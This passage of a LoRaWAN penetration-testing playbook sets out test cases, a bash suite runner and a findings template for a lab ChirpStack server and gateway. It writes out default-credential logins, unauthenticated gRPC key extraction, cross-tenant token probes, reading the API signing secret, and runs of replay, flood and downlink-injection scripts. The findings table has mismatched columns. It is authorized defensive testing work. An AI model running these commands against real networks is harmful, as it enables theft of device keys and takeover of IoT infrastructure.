1. Query ChirpStack API for all registered devices and their activation types:
    ~~~bash
    # Using ChirpStack REST API (adjust API token)
    CS_TOKEN="<your-api-token>"
    CS_HOST="192.168.23.137:8080"

    # List all applications
    curl -s -H "Grpc-Metadata-Authorization: Bearer $CS_TOKEN" \
      "http://$CS_HOST/api/applications?limit=100" | jq '.result[] | {id, name}' \
      | tee ~/lorawan-lab/pentest/evidence/pt012-applications.json

    # For each application, list devices and check device profiles
    curl -s -H "Grpc-Metadata-Authorization: Bearer $CS_TOKEN" \
      "http://$CS_HOST/api/devices?limit=100&applicationId=<APP_ID>" \
      | jq '.result[] | {devEui, name, deviceProfileName}' \
      | tee ~/lorawan-lab/pentest/evidence/pt012-devices.json
    ~~~

2. Check device profiles for ABP configuration:
    ~~~bash
    # List all device profiles
    curl -s -H "Grpc-Metadata-Authorization: Bearer $CS_TOKEN" \
      "http://$CS_HOST/api/device-profiles?limit=100" \
      | jq '.result[] | {id, name, supportsOtaa}' \
      | tee ~/lorawan-lab/pentest/evidence/pt012-device-profiles.json
    ~~~

3. Analyze PCAP captures for ABP indicators:
    ~~~bash
    # ABP devices never send Join-Requests (MType=0) or receive Join-Accepts (MType=1)
    # If a DevAddr is seen sending data but NEVER joined, it's likely ABP
    tshark -r ~/lorawan-lab/pentest/pcap/pentest-full-*.pcap \
      -Y "lorawan.mtype == 0 || lorawan.mtype == 1" \
      -T fields -e lorawan.deveui \
      | sort -u > /tmp/otaa_devices.txt

    tshark -r ~/lorawan-lab/pentest/pcap/pentest-full-*.pcap \
      -Y "lorawan.mtype == 2 || lorawan.mtype == 4" \
      -T fields -e lorawan.devaddr \
      | sort -u > /tmp/active_devices.txt

    echo "[*] Devices with uplink but NO join procedure (potential ABP):"
    comm -23 /tmp/active_devices.txt /tmp/otaa_devices.txt \
      | tee ~/lorawan-lab/pentest/evidence/pt012-potential-abp.txt
    ~~~

**Pass/Fail Criteria**:

| Check | Finding | Severity |
|---|---|---|
| All device profiles use `supportsOtaa: true` | Proper configuration | **PASS** |
| Any device profile has `supportsOtaa: false` (ABP) | Static keys, no rotation, replay-vulnerable | **HIGH** |
| DevAddr observed in traffic with no join procedure | ABP device confirmed | **HIGH** |

**Remediation**:
- Migrate all ABP devices to OTAA activation with unique per-device `AppKey` values.
- If ABP must be used temporarily, enforce unique `NwkSKey`/`AppSKey` per device and enable `DisableFCntCheck: false`.

---

### PT-013: Hardware Debug Port & Key Extraction Audit

**Objective**: Assess physical security of gateway and end-device hardware by checking for exposed debug interfaces (JTAG, UART, SPI, I2C) that could allow root key extraction.

**Severity**: Critical (CVSS 9.1) — Physical access + debug ports = full key compromise.

**STRIDE**: Information Disclosure

> [!WARNING]
> This test requires physical access to lab hardware. Do not perform invasive hardware modifications on production equipment.

**Procedure**:

1. **Visual inspection of Milesight UG65 Gateway**:
    ~~~text
    Inspection Checklist:
    ☐ UART/Serial header pins exposed on PCB?
    ☐ JTAG/SWD pads accessible?
    ☐ USB debug port functional?
    ☐ Micro-SD card slot accessible (potential firmware dump)?
    ☐ Tamper-evident seals present and intact?
    ☐ Enclosure secured with specialty screws?
    ~~~

2. **Visual inspection of Dragino LSN50v2 End-Device**:
    ~~~text
    Inspection Checklist:
    ☐ UART TX/RX pins on internal header?
    ☐ SWD/JTAG pads on STM32 MCU?
    ☐ SPI flash chip containing firmware/keys?
    ☐ AppKey/NwkKey stored in plaintext flash? (requires firmware dump)
    ☐ Secure Element (SE) present for key storage?
    ☐ Read-out protection (RDP) enabled on MCU?
    ~~~

3. **Attempt UART console access on gateway** (if pins found):
    ~~~bash
    # Connect USB-to-UART adapter (TX->RX, RX->TX, GND->GND)
    # Common baud rates: 115200, 9600, 57600
    screen /dev/ttyUSB0 115200

    # Document any shell access, boot logs, or credential prompts
    # Screenshot and save to evidence directory
    ~~~

4. **Gateway firmware version check** (non-invasive):
    ~~~bash
    # Check Milesight gateway firmware version via web API
    curl -s http://192.168.23.150/api/system/info 2>/dev/null \
      | jq '.' | tee ~/lorawan-lab/pentest/evidence/pt013-gw-firmware.json

    # Check for known CVEs against firmware version
    # Cross-reference with Milesight security advisories
    ~~~

**Evidence Documentation**:
- Photograph all exposed debug interfaces.
- Record whether protective measures (conformal coating, epoxy, fuses) are present.
- Log all information obtained through debug interfaces.

**Pass/Fail Criteria**:

| Check | Finding | Severity |
|---|---|---|
| JTAG/UART disabled or physically removed | Properly hardened | **PASS** |
| UART exposed with shell access | Root key extraction possible | **CRITICAL** |
| No Secure Element for key storage | Keys in plaintext flash | **HIGH** |
| MCU read-out protection disabled | Full firmware dump possible | **CRITICAL** |
| Tamper seals absent or broken | Physical compromise undetectable | **MEDIUM** |

---

### PT-014: Gateway Transport Security & Firmware Audit

**Objective**: Verify that gateway-to-server communications use encrypted transport (TLS/mTLS) and that gateway firmware is up-to-date with no known vulnerabilities.

**Severity**: High (CVSS 7.4) — Unencrypted backhaul exposes all LoRaWAN frames in cleartext.

**STRIDE**: Information Disclosure, Tampering

**Procedure**:

1. **Test for unencrypted UDP 1700 traffic** (Semtech Packet Forwarder):
    ~~~bash
    # Capture and inspect — if you can read JSON rxpk payloads in cleartext,
    # the transport is NOT encrypted
    tshark -i eth0 -f "udp port 1700" -c 5 -T fields -e data \
      | tee ~/lorawan-lab/pentest/evidence/pt014-cleartext-check.txt

    # If the output contains readable JSON with "rxpk", "data", "freq" fields,
    # the transport is unencrypted
    ~~~

2. **Check for TLS on MQTT broker**:
    ~~~bash
    # Test if MQTT accepts unencrypted connections on port 1883
    mosquitto_sub -h 192.168.23.137 -p 1883 -t "#" -C 1 -W 5 2>&1 \
      | tee ~/lorawan-lab/pentest/evidence/pt014-mqtt-cleartext.log

    # Test if MQTT TLS is available on port 8883
    mosquitto_sub -h 192.168.23.137 -p 8883 --cafile /dev/null -t "#" -C 1 -W 5 2>&1 \
      | tee ~/lorawan-lab/pentest/evidence/pt014-mqtt-tls.log
    ~~~

3. **Check gateway firmware version and known CVEs**:
    ~~~bash
    curl -s http://192.168.23.150/api/system/info 2>/dev/null \
      | tee ~/lorawan-lab/pentest/evidence/pt014-gw-firmware-version.json

    # Check HTTP security headers on gateway management interface
    curl -sI http://192.168.23.150 \
      | tee ~/lorawan-lab/pentest/evidence/pt014-gw-http-headers.txt

    # Check for Basics Station (WSS) support instead of Semtech UDP
    curl -s http://192.168.23.150/api/lorawan/config 2>/dev/null \
      | tee ~/lorawan-lab/pentest/evidence/pt014-gw-lorawan-config.json
    ~~~

4. **Verify ChirpStack internal TLS configuration**:
    ~~~bash
    # Check if ChirpStack Gateway Bridge uses TLS
    docker exec chirpstack-gateway-bridge cat /etc/chirpstack-gateway-bridge/chirpstack-gateway-bridge.toml 2>/dev/null \
      | grep -i -E "tls|cert|key|ca_cert" \
      | tee ~/lorawan-lab/pentest/evidence/pt014-gwbridge-tls-config.txt
    ~~~

**Pass/Fail Criteria**:

| Check | Finding | Severity |
|---|---|---|
| UDP 1700 transmits frames in cleartext | All LoRaWAN metadata exposed on LAN | **HIGH** |
| MQTT accepting connections on 1883 without TLS | Telemetry exfiltrable via network sniffing | **HIGH** |
| MQTT TLS available on 8883 | Encrypted broker transport | **PASS** |
| Gateway firmware outdated (>12 months old) | Known CVEs may apply | **MEDIUM** |
| Basics Station (WSS/TLS) configured | Encrypted gateway transport | **PASS** |
| No HTTP security headers on gateway web UI | XSS/clickjacking risk | **LOW** |

**Remediation**:
- Migrate from Semtech UDP to **Basics Station** with WebSocket TLS (`wss://`) for encrypted gateway backhaul.
- Enable TLS on MQTT broker and disable plaintext port 1883.
- Update gateway firmware to latest vendor release.

---

### PT-015: ChirpStack gRPC API Security Audit

**Objective**: Enumerate the ChirpStack v4 gRPC API surface, test for unauthenticated access, verify token scope enforcement, and check for Broken Object Level Authorization (BOLA/IDOR).

**Severity**: Critical (CVSS 9.0) — API compromise grants full control over the LoRaWAN network.

**STRIDE**: Information Disclosure, Elevation of Privilege

**Procedure**:

1. **Test for gRPC server reflection** (schema enumeration):
    ~~~bash
    # If reflection is enabled, attacker can discover entire API without docs
    grpcurl -plaintext 192.168.23.137:8080 list 2>&1 \
      | tee ~/lorawan-lab/pentest/evidence/pt015-grpc-reflection.txt

    # If services are listed, reflection is enabled — enumerate further
    grpcurl -plaintext 192.168.23.137:8080 describe api.DeviceService 2>&1 \
      | tee ~/lorawan-lab/pentest/evidence/pt015-grpc-device-service.txt

    grpcurl -plaintext 192.168.23.137:8080 describe api.GatewayService 2>&1 \
      | tee ~/lorawan-lab/pentest/evidence/pt015-grpc-gateway-service.txt

    grpcurl -plaintext 192.168.23.137:8080 describe api.InternalService 2>&1 \
      | tee ~/lorawan-lab/pentest/evidence/pt015-grpc-internal-service.txt
    ~~~

2. **Test unauthenticated access to sensitive endpoints**:
    ~~~bash
    # Attempt to list devices without any auth token
    grpcurl -plaintext -d '{"limit": 10}' \
      192.168.23.137:8080 api.DeviceService/List 2>&1 \
      | tee ~/lorawan-lab/pentest/evidence/pt015-unauth-device-list.txt

    # Attempt to list gateways without auth
    grpcurl -plaintext -d '{"limit": 10}' \
      192.168.23.137:8080 api.GatewayService/List 2>&1 \
      | tee ~/lorawan-lab/pentest/evidence/pt015-unauth-gateway-list.txt

    # Attempt to get device keys without auth
    grpcurl -plaintext -d '{"dev_eui": "a840411f31824150"}' \
      192.168.23.137:8080 api.DeviceService/GetKeys 2>&1 \
      | tee ~/lorawan-lab/pentest/evidence/pt015-unauth-device-keys.txt
    ~~~

3. **Test API token scope escalation (BOLA/IDOR)**:
    ~~~bash
    # Obtain a limited-scope API token (tenant-level)
    CS_TOKEN="<tenant-scoped-api-token>"

    # Attempt to access resources outside the token's tenant scope
    grpcurl -plaintext \
      -H "Authorization: Bearer $CS_TOKEN" \
      -d '{"limit": 100}' \
      192.168.23.137:8080 api.TenantService/List 2>&1 \
      | tee ~/lorawan-lab/pentest/evidence/pt015-bola-tenant-list.txt

    # Attempt to read device keys from another application
    grpcurl -plaintext \
      -H "Authorization: Bearer $CS_TOKEN" \
      -d '{"dev_eui": "0000000000000001"}' \
      192.168.23.137:8080 api.DeviceService/GetKeys 2>&1 \
      | tee ~/lorawan-lab/pentest/evidence/pt015-bola-cross-tenant.txt
    ~~~

4. **Extract the API token signing secret** (if accessible):
    ~~~bash
    # Check if chirpstack.toml is accessible from within the container
    docker exec chirpstack cat /etc/chirpstack/chirpstack.toml 2>/dev/null \
      | grep -A 5 "\[api\]" \
      | tee ~/lorawan-lab/pentest/evidence/pt015-api-secret-check.txt

    # If the 'secret' field is default or weak, ALL tokens can be forged
    ~~~

5. **Test for excessive data exposure in API responses**:
    ~~~bash
    CS_ADMIN_TOKEN="<admin-api-token>"

    # Check if device list exposes session keys
    grpcurl -plaintext \
      -H "Authorization: Bearer $CS_ADMIN_TOKEN" \
      -d '{"dev_eui": "a840411f31824150"}' \
      192.168.23.137:8080 api.DeviceService/GetActivation 2>&1 \
      | tee ~/lorawan-lab/pentest/evidence/pt015-session-key-exposure.txt

    # If NwkSEncKey, AppSKey, or FNwkSIntKey are returned in the response,
    # any authenticated user can extract live session keys
    ~~~

**Pass/Fail Criteria**:

| Check | Finding | Severity |
|---|---|---|
| gRPC reflection enabled | Full API schema exposed to any client | **HIGH** |
| Unauthenticated access returns data | Zero-auth API exploitation | **CRITICAL** |
| Tenant-scoped token accesses other tenants | BOLA/IDOR vulnerability | **CRITICAL** |
| API signing secret is default/weak | Token forgery possible | **CRITICAL** |
| Session keys returned in API responses | Live key exfiltration | **HIGH** |
| All unauthenticated calls return `PERMISSION_DENIED` | Properly secured | **PASS** |
| Reflection disabled in production | API hardened | **PASS** |

**Remediation**:
- Disable gRPC server reflection in production (`chirpstack.toml` → `[api]` section).
- Rotate the API signing secret from any default value to a cryptographically random 256-bit key.
- Audit all API token scopes — enforce principle of least privilege.
- Implement rate limiting on API authentication endpoints.
- Verify `GetActivation` and `GetKeys` endpoints require admin-level tokens.

---

## 5. Automated Full-Suite Pentest Runner

Save as `~/lorawan-lab/pentest/scripts/run_full_pentest.sh`:

~~~bash
#!/bin/bash
#═══════════════════════════════════════════════════════════════════
# LoRaWAN Infrastructure Full Penetration Test Suite Runner
# Executes all PT-001 through PT-015 test cases with evidence logging
#═══════════════════════════════════════════════════════════════════

set -uo pipefail

PENTEST_DIR="$HOME/lorawan-lab/pentest"
EVIDENCE_DIR="$PENTEST_DIR/evidence"
SCRIPTS_DIR="$PENTEST_DIR/scripts"
PCAP_DIR="$PENTEST_DIR/pcap"
TIMESTAMP=$(date -u +%Y%m%dT%H%M%SZ)
MASTER_LOG="$EVIDENCE_DIR/pentest-master-${TIMESTAMP}.log"
CS_HOST="192.168.23.137"
GW_HOST="192.168.23.150"

declare -A TEST_RESULTS

mkdir -p "$EVIDENCE_DIR" "$PCAP_DIR"

run_test() {
    local test_id="$1"
    local test_name="$2"
    local test_cmd="$3"

    echo "" | tee -a "$MASTER_LOG"
    echo "[$test_id] $test_name" | tee -a "$MASTER_LOG"
    if eval "$test_cmd" 2>&1 | tee -a "$MASTER_LOG"; then
        TEST_RESULTS[$test_id]="COMPLETE"
    else
        TEST_RESULTS[$test_id]="ERROR"
    fi
    echo "  [DONE] $test_id (${TEST_RESULTS[$test_id]})" | tee -a "$MASTER_LOG"
}

echo "═══════════════════════════════════════════════════════════════" | tee "$MASTER_LOG"
echo "  LORAWAN PENETRATION TEST SUITE — $TIMESTAMP" | tee -a "$MASTER_LOG"
echo "  Targets: Gateway=$GW_HOST | Server=$CS_HOST" | tee -a "$MASTER_LOG"
echo "═══════════════════════════════════════════════════════════════" | tee -a "$MASTER_LOG"

# Start background packet capture
echo "[*] Starting background packet capture..." | tee -a "$MASTER_LOG"
tshark -i eth0 -f "udp port 1700" \
  -w "$PCAP_DIR/pentest-full-${TIMESTAMP}.pcap" &
CAPTURE_PID=$!
echo "  Capture PID: $CAPTURE_PID" | tee -a "$MASTER_LOG"
sleep 2

# ─── PT-001: Network Reconnaissance ───
run_test "PT-001" "Network Reconnaissance & Service Enumeration" \
  "nmap -sV -sC -T4 $GW_HOST -oN $EVIDENCE_DIR/pt001-gateway-nmap.txt && \
   nmap -sV -sC -T4 $CS_HOST -oN $EVIDENCE_DIR/pt001-chirpstack-nmap.txt && \
   nmap -sU -p 1700,1883,5432,8080 $CS_HOST -oN $EVIDENCE_DIR/pt001-udp-scan.txt"

# ─── PT-002: Default Credentials ───
run_test "PT-002" "Default Credential Audit" \
  "curl -s -o /dev/null -w '%{http_code}' -X POST http://$GW_HOST/api/login \
     -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"password\"}' \
     > $EVIDENCE_DIR/pt002-gw-cred.txt && \
   curl -s -o /dev/null -w '%{http_code}' -X POST http://$CS_HOST:8080/api/internal/login \
     -H 'Content-Type: application/json' -d '{\"email\":\"admin\",\"password\":\"admin\"}' \
     > $EVIDENCE_DIR/pt002-cs-cred.txt && \
   timeout 5 mosquitto_sub -h $CS_HOST -t '#' -C 1 -W 3 > $EVIDENCE_DIR/pt002-mqtt-anon.txt 2>&1 || true"

# ─── PT-003: Gateway EUI Spoofing ───
run_test "PT-003" "Gateway EUI Spoofing" \
  "python3 $SCRIPTS_DIR/pt003_gw_eui_spoof.py"

# ─── PT-004: Frame Replay Attack ───
run_test "PT-004" "Frame Replay Attack (FCnt Regression)" \
  "python3 $SCRIPTS_DIR/pt004_replay_attack.py --pcap $PCAP_DIR/pentest-full-${TIMESTAMP}.pcap || \
   echo '[*] PT-004 requires captured frames — run manually with --pcap or --hex'"

# ─── PT-005: MIC Tampering ───
run_test "PT-005" "MIC Tampering & Bit-Flip Injection" \
  "python3 $SCRIPTS_DIR/pt005_mic_tamper.py"

# ─── PT-006: Join Request Replay & Flood ───
run_test "PT-006" "OTAA Join-Request Replay & Flood" \
  "python3 $SCRIPTS_DIR/pt006_join_replay_flood.py"

# ─── PT-007: MQTT Broker Access ───
run_test "PT-007" "MQTT Broker Unauthenticated Access" \
  "timeout 10 mosquitto_sub -h $CS_HOST -t '#' -v -C 1 -W 5 > $EVIDENCE_DIR/pt007-mqtt-wildcard.log 2>&1 || true && \
   timeout 10 mosquitto_sub -h $CS_HOST -t 'application/+/device/+/event/up' -v -C 1 -W 5 > $EVIDENCE_DIR/pt007-mqtt-uplink.log 2>&1 || true"

# ─── PT-008: MAC Command Injection ───
run_test "PT-008" "MAC Command Injection" \
  "python3 $SCRIPTS_DIR/pt008_mac_cmd_inject.py"

# ─── PT-009: UDP Stress Test ───
run_test "PT-009" "UDP Resource Exhaustion Stress Test" \
  "python3 $SCRIPTS_DIR/pt009_udp_stress.py"

# ─── PT-010: Downlink Injection ───
run_test "PT-010" "Downlink Injection via PULL_RESP" \
  "python3 $SCRIPTS_DIR/pt010_downlink_inject.py"

# ─── PT-011: FCnt Overflow ───
run_test "PT-011" "Frame Counter Overflow & Wraparound" \
  "python3 $SCRIPTS_DIR/pt011_fcnt_overflow.py"

# ─── PT-014: Transport Security ───
run_test "PT-014" "Gateway Transport Security & Firmware Audit" \
  "tshark -i eth0 -f 'udp port 1700' -c 3 -T fields -e data > $EVIDENCE_DIR/pt014-cleartext-check.txt 2>&1 || true && \
   curl -sI http://$GW_HOST > $EVIDENCE_DIR/pt014-gw-http-headers.txt 2>&1 && \
   curl -s http://$GW_HOST/api/system/info > $EVIDENCE_DIR/pt014-gw-firmware-version.json 2>/dev/null || true"

# ─── PT-015: gRPC API Security ───
run_test "PT-015" "ChirpStack gRPC API Security Audit" \
  "grpcurl -plaintext $CS_HOST:8080 list > $EVIDENCE_DIR/pt015-grpc-reflection.txt 2>&1 || true && \
   grpcurl -plaintext -d '{\"limit\": 10}' $CS_HOST:8080 api.DeviceService/List > $EVIDENCE_DIR/pt015-unauth-device-list.txt 2>&1 || true && \
   grpcurl -plaintext -d '{\"limit\": 10}' $CS_HOST:8080 api.GatewayService/List > $EVIDENCE_DIR/pt015-unauth-gateway-list.txt 2>&1 || true"

# ═══ Post-Test Housekeeping ═══

# Stop background capture
echo "" | tee -a "$MASTER_LOG"
echo "[*] Stopping background packet capture (PID: $CAPTURE_PID)..." | tee -a "$MASTER_LOG"
kill "$CAPTURE_PID" 2>/dev/null || true
wait "$CAPTURE_PID" 2>/dev/null || true

# Generate SHA-256 evidence manifest
echo "[*] Generating SHA-256 evidence manifest..." | tee -a "$MASTER_LOG"
sha256sum "$EVIDENCE_DIR"/* "$PCAP_DIR"/* > "$EVIDENCE_DIR/manifest-sha256-${TIMESTAMP}.txt" 2>/dev/null
echo "  Manifest: $EVIDENCE_DIR/manifest-sha256-${TIMESTAMP}.txt" | tee -a "$MASTER_LOG"

# Pull server logs for correlation
echo "[*] Archiving ChirpStack logs for correlation..." | tee -a "$MASTER_LOG"
docker logs chirpstack --since "2h" > "$EVIDENCE_DIR/chirpstack-logs-${TIMESTAMP}.txt" 2>&1
docker logs chirpstack-gateway-bridge --since "2h" > "$EVIDENCE_DIR/gw-bridge-logs-${TIMESTAMP}.txt" 2>&1

# ═══ Results Summary ═══
echo "" | tee -a "$MASTER_LOG"
echo "═══════════════════════════════════════════════════════════════" | tee -a "$MASTER_LOG"
echo "  PENTEST SUITE RESULTS SUMMARY" | tee -a "$MASTER_LOG"
echo "═══════════════════════════════════════════════════════════════" | tee -a "$MASTER_LOG"
for test_id in $(echo "${!TEST_RESULTS[@]}" | tr ' ' '\n' | sort); do
    printf "  %-8s : %s\n" "$test_id" "${TEST_RESULTS[$test_id]}" | tee -a "$MASTER_LOG"
done
echo "" | tee -a "$MASTER_LOG"
echo "  NOTE: PT-012 (ABP Audit) and PT-013 (Hardware Audit) require" | tee -a "$MASTER_LOG"
echo "  manual execution — see playbook for procedures." | tee -a "$MASTER_LOG"
echo "" | tee -a "$MASTER_LOG"
echo "  Master Log   : $MASTER_LOG" | tee -a "$MASTER_LOG"
echo "  Evidence Dir  : $EVIDENCE_DIR" | tee -a "$MASTER_LOG"
echo "  PCAP Dir      : $PCAP_DIR" | tee -a "$MASTER_LOG"
echo "═══════════════════════════════════════════════════════════════" | tee -a "$MASTER_LOG"
~~~

Make executable:
~~~bash
chmod +x ~/lorawan-lab/pentest/scripts/run_full_pentest.sh
~~~

Execute full suite:
~~~bash
~/lorawan-lab/pentest/scripts/run_full_pentest.sh
~~~

---

## 6. Findings Report Template

After executing all test cases, compile findings using this template:

~~~text
═══════════════════════════════════════════════════════════════════════════════
                    LORAWAN PENETRATION TEST FINDINGS REPORT
═══════════════════════════════════════════════════════════════════════════════
Engagement ID     : PENTEST-<YYMMDD>-<NUMBER>
Date              : <YYYY-MM-DD>
Tester            : <Name>
Authorization     : <Manager Name> (Date: <YYYY-MM-DD>)
═══════════════════════════════════════════════════════════════════════════════

EXECUTIVE SUMMARY
─────────────────
Total Test Cases Executed : __
Critical Findings         : __
High Findings             : __
Medium Findings           : __
Informational Findings    : __

FINDINGS DETAIL
───────────────
┌──────────┬──────────────────────────────────────┬──────────┬──────────┐
│ Test ID  │ Description                          │ Severity │ Status   │
├──────────┼──────────────────────────────────────┼──────────┼──────────┤
│ PT-001   │ Service Enumeration                  │ INFO     │ ☐ PASS   │
│ PT-002   │ Default Credentials                  │ CRITICAL │ ☐ PASS   │
│ PT-003   │ Gateway EUI Spoofing                 │ HIGH     │ 7.5  │ S     │ ☐ PASS   │
│ PT-004   │ Frame Replay (FCnt Regression)       │ HIGH     │ 7.5  │ S,T   │ ☐ PASS   │
│ PT-005   │ MIC Tampering & Bit-Flip             │ HIGH     │ 7.5  │ T     │ ☐ PASS   │
│ PT-006   │ DevNonce Replay & Join Flood         │ HIGH     │ 7.5  │ S,D   │ ☐ PASS   │
│ PT-007   │ MQTT Unauthenticated Access          │ CRITICAL │ 9.1  │ I,E   │ ☐ PASS   │
│ PT-008   │ MAC Command Injection                │ MEDIUM   │ 5.3  │ T     │ ☐ PASS   │
│ PT-009   │ UDP Resource Exhaustion              │ MEDIUM   │ 5.3  │ D     │ ☐ PASS   │
│ PT-010   │ Downlink Injection (PULL_RESP)       │ HIGH     │ 7.5  │ S,T   │ ☐ PASS   │
│ PT-011   │ FCnt Overflow / Wraparound           │ HIGH     │ 7.5  │ D,S   │ ☐ PASS   │
│ PT-012   │ ABP Activation Mode Audit            │ HIGH     │ 7.2  │ S,I   │ ☐ PASS   │
│ PT-013   │ Hardware Debug Port Audit            │ CRITICAL │ 9.1  │ I     │ ☐ PASS   │
│ PT-014   │ Transport Security & Firmware        │ HIGH     │ 7.4  │ I,T   │ ☐ PASS   │
│ PT-015   │ gRPC API Security (BOLA/IDOR)        │ CRITICAL │ 9.0  │ I,E   │ ☐ PASS   │
└──────────┴──────────────────────────────────────┴──────────┴──────┴───────┴──────────┘

REMEDIATION RECOMMENDATIONS (Prioritized by CVSS)
──────────────────────────────────────────────────
1. [CRITICAL] PT-002: Change all default credentials immediately.
2. [CRITICAL] PT-007: Enable MQTT authentication; disable anonymous access.
3. [CRITICAL] PT-013: Disable JTAG/UART on production hardware; use Secure Elements.
4. [CRITICAL] PT-015: Disable gRPC reflection; rotate API signing secret.
5. [HIGH]     PT-003: Implement gateway EUI allowlisting in ChirpStack.
6. [HIGH]     PT-004: Enforce strict frame counter validation (no FCnt reset).
7. [HIGH]     PT-010: Restrict UDP 1700 ingress to known gateway IPs via firewall.
8. [HIGH]     PT-011: Enable 32-bit FCnt enforcement in all device profiles.
9. [HIGH]     PT-012: Migrate all ABP devices to OTAA with unique AppKeys.
10.[HIGH]     PT-014: Migrate to Basics Station (WSS/TLS); enable MQTT TLS.
11.[MEDIUM]   PT-008: Validate all MAC commands against server-side policy.
12.[MEDIUM]   PT-009: Implement rate limiting on Gateway Bridge UDP listener.

EVIDENCE MANIFEST
─────────────────
SHA-256 Manifest: ~/lorawan-lab/pentest/evidence/manifest-sha256-<TIMESTAMP>.txt
PCAP Captures  : ~/lorawan-lab/pentest/pcap/
Server Logs    : ~/lorawan-lab/pentest/evidence/chirpstack-logs-<TIMESTAMP>.txt
GW Bridge Logs : ~/lorawan-lab/pentest/evidence/gw-bridge-logs-<TIMESTAMP>.txt
═══════════════════════════════════════════════════════════════════════════════
~~~

---

## 7. References & Linked Documentation

### Internal Documentation
- [06: LoRaWAN RF and Security Toolkit Brief](./06-lorawan-rf-security-toolkit-brief.md)
- [07: LoRaWAN Protocol and Security Testing Setup Guide](./07-lorawan-rf-and-protocol-testing-setup-guide.md)
- [08: LoRaWAN Infrastructure Security Audit Runbook](./08-lorawan-security-testing-runbook.md)
- [10: Wireshark LoRaWAN Security & Protocol Analysis Handbook](../technology-docs/10-wireshark-lorawan-security-handbook.md)

### LoRaWAN Standards & Specifications
- [LoRaWAN 1.0.4 Specification](https://lora-alliance.org/resource_hub/lorawan-104-specification-package/)
- [LoRa Alliance Technical Recommendation TR007 — LoRaWAN Security](https://lora-alliance.org/resource_hub/tr007-lorawan-security/)
- [LoRaWAN Backend Interfaces Specification](https://lora-alliance.org/resource_hub/lorawan-back-end-interfaces-v1-0/)

### Security Frameworks & Standards
- [OWASP IoT Top 10 (2024)](https://owasp.org/www-project-internet-of-things/)
- [OWASP API Security Top 10](https://owasp.org/API-Security/)
- [STRIDE Threat Modeling](https://learn.microsoft.com/en-us/azure/security/develop/threat-modeling-tool-threats)
- [CVSS v3.1 Calculator](https://www.first.org/cvss/calculator/3.1)

### ChirpStack Documentation
- [ChirpStack Gateway Bridge — Semtech UDP](https://www.chirpstack.io/docs/chirpstack-gateway-bridge/gateways/semtech-udp.html)
- [ChirpStack Gateway Bridge — Basics Station](https://www.chirpstack.io/docs/chirpstack-gateway-bridge/gateways/basics-station.html)
- [ChirpStack MQTT Integration](https://www.chirpstack.io/docs/chirpstack/integrations/mqtt.html)
- [ChirpStack gRPC API Reference](https://www.chirpstack.io/docs/chirpstack/api/)

### Tool Documentation
- [Wireshark LoRaWAN Display Filters](https://www.wireshark.org/docs/dfref/l/lorawan.html)
- [grpcurl — CLI for gRPC](https://github.com/fullstorydev/grpcurl)
- [Nmap — Network Scanner](https://nmap.org/book/man.html)
- [Scapy — Packet Crafting](https://scapy.net/)
